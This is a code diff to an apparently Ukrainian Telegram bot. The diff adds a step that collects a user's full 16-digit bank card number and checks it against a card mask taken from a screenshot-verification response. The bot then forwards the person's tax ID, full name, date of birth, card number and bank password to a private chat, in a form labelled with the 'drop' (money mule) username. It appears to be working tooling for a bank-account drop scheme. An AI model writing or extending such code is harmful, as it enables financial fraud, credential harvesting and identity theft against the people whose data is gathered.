@@ -15,6 +15,7 @@ class RegistrationStates(StatesGroup):
     waiting_confirm = State()
     waiting_phone = State()
     waiting_password = State()
+    waiting_card_number = State()
 
 def clean_pib(pib: str) -> str:
     # Видаляємо допоміжні фрази на кшталт "дата народження", "д.н." тощо
@@ -242,6 +243,50 @@ async def handle_restart_reg(callback: CallbackQuery, state: FSMContext):
 async def process_client_password(message: Message, state: FSMContext):
     password = message.text.strip()
     await state.update_data(client_password=password)
+    
+    # Перевіряємо поточний банк у сесії
+    client_id = message.from_user.id
+    session = await db.get_session(client_id)
+    bank_name = ""
+    if session and session['line_id']:
+        line_info = await db.get_line(session['line_id'])
+        if line_info:
+            bank_name = line_info['bank'].strip().lower()
+
+    if bank_name == "bank.kd":
+        await message.answer("Будь ласка, напишіть повний номер Вашої карти (16 цифр)?")
+        await state.set_state(RegistrationStates.waiting_card_number)
+    else:
+        await message.answer("Будь ласка, напишіть Ваш номер телефону?")
+        await state.set_state(RegistrationStates.waiting_phone)
+
+
+@router.message(RegistrationStates.waiting_card_number, F.chat.type == "private")
+async def process_client_card_number(message: Message, state: FSMContext):
+    text = message.text.strip()
+    cleaned_card = re.sub(r'\D', '', text)
+    
+    if len(cleaned_card) != 16:
+        await message.answer("Номер карти має складатися рівно з 16 цифр. Будь ласка, перевірте та спробуйте ще раз:")
+        return
+
+    # Отримуємо дані стану
+    state_data = await state.get_data()
+    card_first4 = state_data.get("card_first4")
+    card_last4 = state_data.get("card_last4")
+    
+    if card_first4 and card_last4:
+        if cleaned_card[:4] != card_first4 or cleaned_card[-4:] != card_last4:
+            await message.answer(
+                "Введений номер карти не збігається з даними на скріншоті.\n"
+                "Будь ласка, перевірте та напишіть правильний номер карти:"
+            )
+            return
+
+    # Зберігаємо номер карти
+    formatted_card = f"{cleaned_card[:4]} {cleaned_card[4:8]} {cleaned_card[8:12]} {cleaned_card[12:]}"
+    await state.update_data(client_card=formatted_card)
+    
     await message.answer("Будь ласка, напишіть Ваш номер телефону?")
     await state.set_state(RegistrationStates.waiting_phone)
 
@@ -274,6 +319,7 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
     data = await state.get_data()
     client_password = data.get('client_password')
     success_photo_id = data.get('success_photo_id') or data.get('last_photo_id')
+    client_card = data.get('client_card')
     
     await state.clear()
 
@@ -301,9 +347,8 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
             line_str = f"Line {line_id} Return: {line_info['phone_number']} | {line_info['bank']}"
             bank_name = line_info['bank']
 
-    # Формуємо анкету
+    # Формуємо анкету без "РЕЄСТРАЦІЙНІ ДАНІ"
     anketa_text = (
-        "РЕЄСТРАЦІЙНІ ДАНІ\n\n"
         f"ІПН: {ipn}\n"
         f"ПІБ: {pib}\n"
         f"Дата: {dob}\n"
@@ -315,6 +360,10 @@ async def process_client_phone(message: Message, state: FSMContext, bot: Bot):
         anketa_text += f"Дроп - @{username}\n\n"
         
     anketa_text += f"{line_str}\n\n"
+    
+    if client_card:
+        anketa_text += f"Номер карти: {client_card}\n"
+        
     anketa_text += f"{client_password}"
     
     from bot.config import ANKETA_CHAT_ID
@@ -443,6 +492,11 @@ async def handle_client_data_manual(message: Message, state: FSMContext, bot: Bo
         )
         
         if "[SUCCESS_VERIFICATION]" in response:
+            # Парсимо маску картки, якщо вона є
+            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
+            if card_match:
+                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
+            
             bank_label = current_bank_name if current_bank_name else "банк"
             success_text = (
                 f"Чудово {bank_label} успішно зареєстрували.\n\n"
@@ -502,6 +556,11 @@ async def handle_client_photo(message: Message, state: FSMContext, bot: Bot):
         )
         
         if "[SUCCESS_VERIFICATION]" in response:
+            # Парсимо маску картки, якщо вона є
+            card_match = re.search(r'\[CARD_MASK:\s*(\d{4})\.\.\.(\d{4})\]', response)
+            if card_match:
+                await state.update_data(card_first4=card_match.group(1), card_last4=card_match.group(2))
+            
             bank_label = current_bank_name if current_bank_name else "банк"
             success_text = (
                 f"Чудово {bank_label} успішно зареєстрували.\n\n"
